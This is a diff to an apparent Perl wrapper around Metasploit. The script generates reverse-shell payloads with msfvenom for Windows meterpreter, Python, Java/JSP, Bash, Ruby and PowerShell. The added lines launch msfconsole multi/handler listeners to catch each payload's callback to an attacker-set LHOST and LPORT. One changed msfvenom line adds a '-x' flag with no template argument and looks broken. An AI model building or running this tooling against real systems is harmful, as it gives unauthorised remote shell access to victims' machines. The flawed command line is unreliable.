@@ -112,7 +112,7 @@ sub generate_payload_windows {
     my $output_file = "rakumsf.exe";
     my $payload = "windows/meterpreter/reverse_tcp";
     my $options = "LHOST=$host LPORT=$port";
-    my $command = "msfvenom -p $payload $options -f exe > $output_file";
+    my $command = "msfvenom -p $payload $options -x -f exe > $output_file";
     system($command);
 
     print "Windows payload generated: $output_file\n";
@@ -172,7 +172,7 @@ sub generate_payload_python {
     my $command = "msfvenom -p $payload $options -f raw > $output_file";
     system($command);
     print "Python payload generated: $output_file\n";
-    
+    system("msfconsole -qx 'use exploit/multi/handler;set payload cmd/unix/reverse_python;set LHOST $host;set LPORT $port;run'");
 }
 
 sub generate_payload_jar {
@@ -182,6 +182,7 @@ sub generate_payload_jar {
     my $command = "msfvenom -p $payload $options -o $output_file";
     system($command);
     print "JAR payload generated: $output_file\n";
+    system("msfconsole -qx 'use exploit/multi/handler;set payload java/jsp_shell_reverse_tcp;set LHOST $host;set LPORT $port;run'");
 }
 
 sub generate_payload_bash {
@@ -191,6 +192,7 @@ sub generate_payload_bash {
     my $command = "msfvenom -p $payload $options -f raw > $output_file";
     system($command);
     print "Bash payload generated: $output_file\n";
+    system("msfconsole -qx 'use exploit/multi/handler;set payload cmd/unix/reverse_bash;set LHOST $host;set LPORT $port;run'");
 }
 
 sub generate_payload_ruby {
@@ -200,6 +202,7 @@ sub generate_payload_ruby {
     my $command = "msfvenom -p $payload $options -f raw > $output_file";
     system($command);
     print "Ruby payload generated: $output_file\n";
+    system("msfconsole -qx 'use exploit/multi/handler;set payload cmd/unix/reverse_ruby;set LHOST $host;set LPORT $port;run'");
 }
 
 sub generate_payload_powershell {
@@ -209,6 +212,7 @@ sub generate_payload_powershell {
     my $command = "msfvenom -p $payload $options -f psh > $output_file";
     system($command);
     print "PowerShell payload generated: $output_file\n";
+    system("msfconsole -qx 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $host;set LPORT $port;run'");
 }
 sub update_script{
 system("sudo apt install libpar-packer-perl");
